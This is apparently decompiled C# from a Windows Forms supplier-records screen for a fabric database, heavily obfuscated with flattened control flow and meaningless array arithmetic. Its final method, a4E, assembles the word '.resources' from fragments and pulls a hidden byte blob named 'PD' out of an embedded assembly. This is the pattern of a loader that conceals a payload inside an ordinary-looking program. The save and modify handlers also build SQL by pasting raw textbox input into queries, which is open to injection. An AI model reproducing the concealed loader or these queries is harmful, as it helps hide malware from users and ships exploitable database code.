using System;
using System.Collections;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Bz5f;
using Microsoft.VisualBasic.CompilerServices;
using d3TQ;
using w0WN;

namespace a7A;

[DesignerGenerated]
public class a9X : Form
{
	private IContainer components;

	private string cs;

	private SqlConnection cn;

	private SqlCommand cmd;

	private SqlDataReader rd;

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Jx9;
			Label label = _Label6;
			Label obj = label;
			Hi84.char_0[214] = (char)((Hi84.char_0[214] ^ Hi84.char_0[485]) & 'ö');
			if (obj != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label6 = value;
			label = _Label6;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Cx6;
			Label label = _Label7;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label7 = value;
			label = _Label7;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtSRcode")]
	internal virtual TextBox txtSRcode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSRName")]
	internal virtual TextBox txtSRName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSCode")]
	internal virtual TextBox txtSCode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnDelete
	{
		[CompilerGenerated]
		get
		{
			return _btnDelete;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			byte[] byte_ = Tf67.byte_0;
			int num = 3;
			while (true)
			{
				IL_005e:
				EventHandler eventHandler = c6F;
				Button val = _btnDelete;
				Button obj = val;
				Hi84.char_0[370] = (char)((Hi84.char_0[370] - Hi84.char_0[367]) & '\u009b');
				if (obj == null)
				{
					num = 4;
					goto IL_0047;
				}
				num = 5;
				goto IL_0040;
				IL_0047:
				while (true)
				{
					_btnDelete = value;
					val = _btnDelete;
					if (val == null)
					{
						switch (byte_[15])
						{
						case 113:
							break;
						case 112:
							continue;
						default:
							goto IL_005e;
						case 109:
							goto IL_00a4;
						case 110:
						case 114:
							return;
						}
						break;
					}
					num = 1;
					goto IL_00a4;
					IL_00a4:
					((Control)val).add_Click(eventHandler);
					return;
				}
				goto IL_0040;
				IL_0040:
				((Control)val).remove_Click(eventHandler);
				goto IL_0047;
			}
		}
	}

	internal virtual Button btnModify
	{
		[CompilerGenerated]
		get
		{
			return _btnModify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = y1Y;
			Button val = _btnModify;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnModify = value;
			val = _btnModify;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtSEmail")]
	internal virtual TextBox txtSEmail
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSName")]
	internal virtual TextBox txtSName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSRAmount")]
	internal virtual TextBox txtSRAmount
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnSave
	{
		[CompilerGenerated]
		get
		{
			return _btnSave;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = x6C;
			Button val = _btnSave;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnSave = value;
			val = _btnSave;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtSphoneno")]
	internal virtual TextBox txtSphoneno
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public a9X()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Zi9);
		cs = "Data Source=DESKTOP-1L8UME0\\SQLEXPRESS;Initial Catalog=db_fabric;Integrated Security=True";
		cn = new SqlConnection(cs);
		cmd = new SqlCommand();
		Wz1();
	}

	[DebuggerNonUserCode]
	protected override void Wj9(bool Ni8)
	{
		try
		{
			if (Ni8 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Ni8);
		}
	}

	[DebuggerStepThrough]
	private void Wz1()
	{
		//IL_02af: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b9: Expected O, but got Unknown
		//IL_032a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0334: Expected O, but got Unknown
		//IL_039a: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a4: Expected O, but got Unknown
		//IL_0521: Unknown result type (might be due to invalid IL or missing references)
		//IL_052b: Expected O, but got Unknown
		//IL_052c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0536: Expected O, but got Unknown
		//IL_0537: Unknown result type (might be due to invalid IL or missing references)
		//IL_0541: Expected O, but got Unknown
		//IL_054e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0558: Expected O, but got Unknown
		//IL_0559: Unknown result type (might be due to invalid IL or missing references)
		//IL_0563: Expected O, but got Unknown
		//IL_0564: Unknown result type (might be due to invalid IL or missing references)
		//IL_056e: Expected O, but got Unknown
		//IL_0573: Unknown result type (might be due to invalid IL or missing references)
		//IL_057d: Expected O, but got Unknown
		//IL_057e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0588: Expected O, but got Unknown
		//IL_0589: Unknown result type (might be due to invalid IL or missing references)
		//IL_0593: Expected O, but got Unknown
		//IL_0599: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a3: Expected O, but got Unknown
		//IL_05a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ae: Expected O, but got Unknown
		//IL_05af: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b9: Expected O, but got Unknown
		//IL_05bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c9: Expected O, but got Unknown
		//IL_05ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d4: Expected O, but got Unknown
		//IL_05d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05df: Expected O, but got Unknown
		//IL_05e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ef: Expected O, but got Unknown
		//IL_05f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fa: Expected O, but got Unknown
		//IL_05fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0605: Expected O, but got Unknown
		//IL_060b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Expected O, but got Unknown
		//IL_0616: Unknown result type (might be due to invalid IL or missing references)
		//IL_0620: Expected O, but got Unknown
		//IL_0621: Unknown result type (might be due to invalid IL or missing references)
		//IL_062b: Expected O, but got Unknown
		byte[] byte_ = Tf67.byte_0;
		char[] char_ = Hi84.char_0;
		int num = 86;
		while (true)
		{
			Label3 = new Label();
			Label6 = new Label();
			Label7 = new Label();
			num = 6;
			while (true)
			{
				txtSRcode = new TextBox();
				Label10 = new Label();
				DataGridView1 = new DataGridView();
				num = 73;
				while (true)
				{
					Label9 = new Label();
					txtSRName = new TextBox();
					Label8 = new Label();
					num = 12;
					while (true)
					{
						Label5 = new Label();
						Label4 = new Label();
						txtSCode = new TextBox();
						num = 72;
						while (true)
						{
							btnDelete = new Button();
							btnModify = new Button();
							txtSEmail = new TextBox();
							num = 77;
							while (true)
							{
								txtSName = new TextBox();
								txtSRAmount = new TextBox();
								Label2 = new Label();
								num = 2;
								while (true)
								{
									btnSave = new Button();
									txtSphoneno = new TextBox();
									Label1 = new Label();
									num = (int)byte_[10] / 6;
									while (true)
									{
										switch (num)
										{
										case 83:
											((Control)txtSRcode).set_Size(new Size(100, 20));
											((Control)txtSRcode).set_TabIndex(6);
											num = 32;
											goto case 32;
										case 32:
											Label10.set_AutoSize(true);
											((Control)Label10).set_ForeColor(Color.White);
											num = 19;
											goto case 19;
										case 19:
											((Control)Label10).set_Location(new Point(428, 157));
											((Control)Label10).set_Name("Label10");
											num = 37;
											goto case 37;
										case 37:
											((Control)Label10).set_Size(new Size(60, 13));
											((Control)Label10).set_TabIndex(99);
											num = 39;
											goto case 39;
										case 39:
											Label10.set_Text("Raw Code:");
											DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
											num = 16;
											goto case 16;
										case 16:
											((Control)DataGridView1).set_Location(new Point(32, 239));
											((Control)DataGridView1).set_Name("DataGridView1");
											num = 58;
											goto case 58;
										case 58:
											((Control)DataGridView1).set_Size(new Size(724, 199));
											((Control)DataGridView1).set_TabIndex(11);
											num = 55;
											goto case 55;
										case 55:
											Label9.set_AutoSize(true);
											((Control)Label9).set_ForeColor(Color.White);
											num = char_[338] - 53153;
											continue;
										case 78:
											((Control)Label7).set_Name("Label7");
											((Control)Label7).set_Size(new Size(92, 17));
											num = 41;
											goto case 41;
										case 41:
											((Control)Label7).set_TabIndex(10);
											Label7.set_Text("Go To Main");
											num = 40;
											goto case 40;
										case 40:
											((Control)txtSRcode).set_Location(new Point(504, 151));
											((Control)txtSRcode).set_Name("txtSRcode");
											num = 83;
											goto case 83;
										case 68:
											((Control)Label6).set_TabIndex(11);
											Label6.set_Text("X");
											num = 25;
											goto case 25;
										case 25:
											Label7.set_AutoSize(true);
											((Control)Label7).set_BackColor(Color.Blue);
											num = char_[32] - 9335;
											continue;
										case 67:
											((Control)Label6).set_Name("Label6");
											((Control)Label6).set_Size(new Size(18, 17));
											num = 68;
											goto case 68;
										case 66:
											((Control)Label3).set_Name("Label3");
											((Control)Label3).set_Size(new Size(115, 17));
											num = 1;
											goto case 1;
										case 1:
											((Control)Label3).set_TabIndex(9);
											Label3.set_Text("Supplier Detail");
											num = 36;
											goto case 36;
										case 36:
											Label6.set_AutoSize(true);
											((Control)Label6).set_BackColor(Color.Blue);
											num = 33;
											goto case 33;
										case 33:
											((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
											num = 52;
											goto case 20;
										case 20:
										case 52:
											((Control)Label6).set_ForeColor(Color.White);
											((Control)Label6).set_Location(new Point(721, 29));
											num = 67;
											goto case 67;
										case 28:
											((Control)Label7).set_ForeColor(Color.White);
											((Control)Label7).set_Location(new Point(29, 29));
											num = 78;
											goto case 78;
										case 22:
											((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
											num = 28;
											goto case 28;
										case 21:
											((Control)Label3).set_ForeColor(Color.White);
											((Control)Label3).set_Location(new Point(336, 29));
											num = 66;
											goto case 66;
										case 10:
											((ISupportInitialize)DataGridView1).BeginInit();
											((Control)this).SuspendLayout();
											Label3.set_AutoSize(true);
											num = 8;
											goto case 8;
										case 8:
											((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
											num = 21;
											goto case 21;
										case 2:
											break;
										case 77:
											goto end_IL_0520;
										case 72:
											goto end_IL_054d;
										case 12:
											goto end_IL_0572;
										case 73:
											goto end_IL_0598;
										case 6:
											goto end_IL_05be;
										default:
											goto end_IL_05e4;
										case 46:
											((Control)Label9).set_Location(new Point(422, 95));
											((Control)Label9).set_Name("Label9");
											num = 5;
											goto case 5;
										case 5:
											((Control)Label9).set_Size(new Size(66, 13));
											((Control)Label9).set_TabIndex(96);
											num = 89;
											goto case 89;
										case 89:
											Label9.set_Text("Raw Name :");
											((Control)txtSRName).set_Location(new Point(504, 88));
											num = 9;
											goto case 9;
										case 9:
											((Control)txtSRName).set_Name("txtSRName");
											((Control)txtSRName).set_Size(new Size(100, 20));
											num = 44;
											goto case 44;
										case 44:
											((Control)txtSRName).set_TabIndex(4);
											Label8.set_AutoSize(true);
											num = 88;
											goto case 88;
										case 88:
											((Control)Label8).set_ForeColor(Color.White);
											((Control)Label8).set_Location(new Point(164, 182));
											num = 81;
											goto case 81;
										case 81:
											((Control)Label8).set_Name("Label8");
											((Control)Label8).set_Size(new Size(50, 13));
											num = 30;
											goto case 30;
										case 30:
											((Control)Label8).set_TabIndex(94);
											Label8.set_Text("Email Id :");
											num = 85;
											goto case 85;
										case 85:
											Label5.set_AutoSize(true);
											((Control)Label5).set_ForeColor(Color.White);
											num = 80;
											goto case 80;
										case 80:
											((Control)Label5).set_Location(new Point(134, 122));
											((Control)Label5).set_Name("Label5");
											num = 50;
											goto case 50;
										case 50:
											((Control)Label5).set_Size(new Size(82, 13));
											((Control)Label5).set_TabIndex(93);
											num = 34;
											goto case 34;
										case 34:
											Label5.set_Text("Supplier Name :");
											Label4.set_AutoSize(true);
											num = 27;
											goto case 27;
										case 27:
											((Control)Label4).set_ForeColor(Color.White);
											((Control)Label4).set_Location(new Point(414, 127));
											num = 49;
											goto case 49;
										case 49:
											((Control)Label4).set_Name("Label4");
											((Control)Label4).set_Size(new Size(74, 13));
											goto case 7;
										case 7:
											num = 63;
											goto case 63;
										case 63:
											((Control)Label4).set_TabIndex(92);
											Label4.set_Text("Raw Amount :");
											num = 57;
											goto case 57;
										case 57:
											((Control)txtSCode).set_Location(new Point(241, 85));
											((Control)txtSCode).set_Name("txtSCode");
											num = 90;
											goto case 90;
										case 90:
											((Control)txtSCode).set_Size(new Size(100, 20));
											((Control)txtSCode).set_TabIndex(0);
											num = 18;
											goto case 18;
										case 18:
											((Control)btnDelete).set_Location(new Point(483, 202));
											((Control)btnDelete).set_Name("btnDelete");
											num = 17;
											goto case 17;
										case 17:
											((Control)btnDelete).set_Size(new Size(75, 31));
											((Control)btnDelete).set_TabIndex(9);
											num = 15;
											goto case 15;
										case 15:
											((ButtonBase)btnDelete).set_Text("DELETE");
											((ButtonBase)btnDelete).set_UseVisualStyleBackColor(true);
											num = 13;
											goto case 13;
										case 13:
											((Control)btnModify).set_Location(new Point(365, 202));
											((Control)btnModify).set_Name("btnModify");
											num = 59;
											goto case 59;
										case 59:
											((Control)btnModify).set_Size(new Size(75, 31));
											((Control)btnModify).set_TabIndex(8);
											num = 64;
											goto case 64;
										case 64:
											((ButtonBase)btnModify).set_Text("MODIFY");
											((ButtonBase)btnModify).set_UseVisualStyleBackColor(true);
											num = 3;
											goto case 3;
										case 3:
											((Control)txtSEmail).set_Location(new Point(241, 176));
											((Control)txtSEmail).set_Name("txtSEmail");
											num = 35;
											goto case 35;
										case 35:
											((Control)txtSEmail).set_Size(new Size(100, 20));
											((Control)txtSEmail).set_TabIndex(3);
											num = 42;
											goto case 42;
										case 42:
											((Control)txtSName).set_Location(new Point(239, 115));
											((Control)txtSName).set_Name("txtSName");
											num = 48;
											goto case 48;
										case 48:
											((Control)txtSName).set_Size(new Size(100, 20));
											((Control)txtSName).set_TabIndex(1);
											num = 38;
											goto case 38;
										case 38:
											((Control)txtSRAmount).set_Location(new Point(504, 122));
											((Control)txtSRAmount).set_Name("txtSRAmount");
											num = 62;
											goto case 62;
										case 62:
											((Control)txtSRAmount).set_Size(new Size(100, 20));
											((Control)txtSRAmount).set_TabIndex(5);
											num = 82;
											goto case 82;
										case 82:
											Label2.set_AutoSize(true);
											((Control)Label2).set_ForeColor(Color.White);
											num = 79;
											goto case 79;
										case 79:
											((Control)Label2).set_Location(new Point(138, 88));
											((Control)Label2).set_Name("Label2");
											num = 4;
											goto case 4;
										case 4:
											((Control)Label2).set_Size(new Size(79, 13));
											((Control)Label2).set_TabIndex(90);
											num = 69;
											goto case 69;
										case 69:
											Label2.set_Text("Supplier Code :");
											((Control)btnSave).set_Location(new Point(236, 202));
											num = 45;
											goto case 45;
										case 45:
											((Control)btnSave).set_Name("btnSave");
											((Control)btnSave).set_Size(new Size(75, 31));
											goto case 14;
										case 14:
											num = 60;
											goto case 60;
										case 60:
											((Control)btnSave).set_TabIndex(7);
											((ButtonBase)btnSave).set_Text("SAVE");
											num = 31;
											goto case 31;
										case 31:
											((ButtonBase)btnSave).set_UseVisualStyleBackColor(true);
											((Control)txtSphoneno).set_Location(new Point(239, 150));
											num = 0;
											goto case 0;
										case 0:
											((Control)txtSphoneno).set_Name("txtSphoneno");
											((Control)txtSphoneno).set_Size(new Size(100, 20));
											num = 87;
											goto case 87;
										case 87:
											((Control)txtSphoneno).set_TabIndex(2);
											Label1.set_AutoSize(true);
											num = 47;
											goto case 47;
										case 47:
											((Control)Label1).set_ForeColor(Color.White);
											((Control)Label1).set_Location(new Point(153, 153));
											num = 24;
											goto case 24;
										case 24:
											((Control)Label1).set_Name("Label1");
											((Control)Label1).set_Size(new Size(61, 13));
											num = 61;
											goto case 61;
										case 61:
											((Control)Label1).set_TabIndex(101);
											Label1.set_Text("Phone No :");
											num = 11;
											goto case 11;
										case 11:
											((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
											((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
											num = 29;
											goto case 29;
										case 29:
											((Form)this).set_BackColor(Color.FromArgb(0, 0, 64));
											((Form)this).set_ClientSize(new Size(800, 450));
											num = 51;
											goto case 51;
										case 51:
											((Control)this).get_Controls().Add((Control)(object)Label1);
											((Control)this).get_Controls().Add((Control)(object)txtSphoneno);
											num = 53;
											goto case 53;
										case 53:
											((Control)this).get_Controls().Add((Control)(object)txtSRcode);
											((Control)this).get_Controls().Add((Control)(object)Label10);
											num = 84;
											goto case 84;
										case 84:
											((Control)this).get_Controls().Add((Control)(object)DataGridView1);
											((Control)this).get_Controls().Add((Control)(object)Label9);
											num = 75;
											goto case 75;
										case 75:
											((Control)this).get_Controls().Add((Control)(object)txtSRName);
											((Control)this).get_Controls().Add((Control)(object)Label8);
											num = 76;
											goto case 76;
										case 76:
											((Control)this).get_Controls().Add((Control)(object)Label5);
											((Control)this).get_Controls().Add((Control)(object)Label4);
											num = 71;
											goto case 71;
										case 71:
											((Control)this).get_Controls().Add((Control)(object)txtSCode);
											((Control)this).get_Controls().Add((Control)(object)btnDelete);
											num = 65;
											goto case 65;
										case 65:
											((Control)this).get_Controls().Add((Control)(object)btnModify);
											((Control)this).get_Controls().Add((Control)(object)txtSEmail);
											num = 74;
											goto case 74;
										case 74:
											((Control)this).get_Controls().Add((Control)(object)txtSName);
											((Control)this).get_Controls().Add((Control)(object)txtSRAmount);
											num = 70;
											goto case 70;
										case 70:
											((Control)this).get_Controls().Add((Control)(object)Label2);
											((Control)this).get_Controls().Add((Control)(object)btnSave);
											num = 54;
											goto case 54;
										case 54:
											((Control)this).get_Controls().Add((Control)(object)Label6);
											((Control)this).get_Controls().Add((Control)(object)Label7);
											num = 26;
											goto case 26;
										case 26:
											((Control)this).get_Controls().Add((Control)(object)Label3);
											((Form)this).set_FormBorderStyle((FormBorderStyle)0);
											num = 23;
											goto case 23;
										case 23:
											((Control)this).set_Name("frmSupplierDetail");
											((Form)this).set_StartPosition((FormStartPosition)1);
											((Form)this).set_Text("frmSupplierDetail");
											num = 43;
											goto case 43;
										case 43:
											((ISupportInitialize)DataGridView1).EndInit();
											((Control)this).ResumeLayout(false);
											((Control)this).PerformLayout();
											num = 56;
											return;
										case 56:
											return;
										}
										break;
									}
									continue;
									end_IL_0520:
									break;
								}
								continue;
								end_IL_054d:
								break;
							}
							continue;
							end_IL_0572:
							break;
						}
						continue;
						end_IL_0598:
						break;
					}
					continue;
					end_IL_05be:
					break;
				}
				continue;
				end_IL_05e4:
				break;
			}
		}
	}

	private void Cx6(object sender, EventArgs e)
	{
		Hi84 hi = new Hi84();
		((Control)hi).Show();
		((Control)this).Hide();
	}

	private void Jx9(object sender, EventArgs e)
	{
		((Component)this).Dispose();
	}

	private void Zi9(object sender, EventArgs e)
	{
		k0J();
	}

	private void x6C(object sender, EventArgs e)
	{
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("insert into tbl_supplier_detail values(" + Conversions.ToString(Conversions.ToInteger(txtSCode.get_Text())) + ",'" + txtSName.get_Text() + "','" + txtSphoneno.get_Text() + "','" + txtSEmail.get_Text() + "','" + txtSRName.get_Text() + "'," + Conversions.ToString(Conversions.ToInteger(txtSRAmount.get_Text())) + "," + Conversions.ToString(Conversions.ToInteger(txtSRcode.get_Text())) + ")");
			cmd.ExecuteReader();
			MessageBox.Show("Record Saved");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		k0J();
	}

	public void k0J()
	{
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		DataGridView1.get_Rows().Clear();
		DataGridView1.get_Columns().Clear();
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("select * from tbl_supplier_detail");
			rd = cmd.ExecuteReader();
			DataGridView1.get_Columns().Add("c1", "Supplier Code");
			DataGridView1.get_Columns().Add("c2", "Supplier Name");
			DataGridView1.get_Columns().Add("c3", "Phone No");
			DataGridView1.get_Columns().Add("c4", "Email Id");
			DataGridView1.get_Columns().Add("c5", "Raw Name");
			DataGridView1.get_Columns().Add("c6", "Raw Amount");
			DataGridView1.get_Columns().Add("c7", "Raw Code");
			while (true)
			{
				bool num = rd.Read();
				Tf67.byte_0[69] = (byte)((Tf67.byte_0[69] + Tf67.byte_0[4]) & 0x88);
				if (num)
				{
					DataGridView1.get_Rows().Add(new object[7]
					{
						rd.get_Item("scode").ToString(),
						rd.get_Item("sname"),
						rd.get_Item("sphoneno"),
						rd.get_Item("semail"),
						rd.get_Item("raw"),
						rd.get_Item("rawamt").ToString(),
						rd.get_Item("rawcode").ToString()
					});
					continue;
				}
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
	}

	private void c6F(object sender, EventArgs e)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("delete from tbl_supplier_detail where scode=" + Conversions.ToString(Conversions.ToInteger(txtSCode.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Deleted");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		k0J();
	}

	private void y1Y(object sender, EventArgs e)
	{
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("update tbl_supplier_detail set sname='" + txtSName.get_Text() + "',sphoneno='" + txtSphoneno.get_Text() + "',semail='" + txtSEmail.get_Text() + "',raw='" + txtSRName.get_Text() + "',rawamt=" + Conversions.ToString(Conversions.ToInteger(txtSRAmount.get_Text())) + ",rawcode=" + Conversions.ToString(Conversions.ToInteger(txtSRcode.get_Text())) + "  where scode=" + Conversions.ToString(Conversions.ToInteger(txtSCode.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Modified");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		k0J();
	}

	internal static byte[] a4E(string[] Gk8, int a7D)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[Gk8.Length - 1 + 1];
				int num = Gk8.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						string value = string.Format("{0}{1}{2}{3}{4}", ".r", "es", "ou", "rc", "es");
						if (Gk8[i].Contains(value))
						{
							int startIndex = Gk8[i].IndexOf(value);
							array[i] = Gk8[i].Remove(startIndex, 10);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)f5R4.mDic["AO"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "PD", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
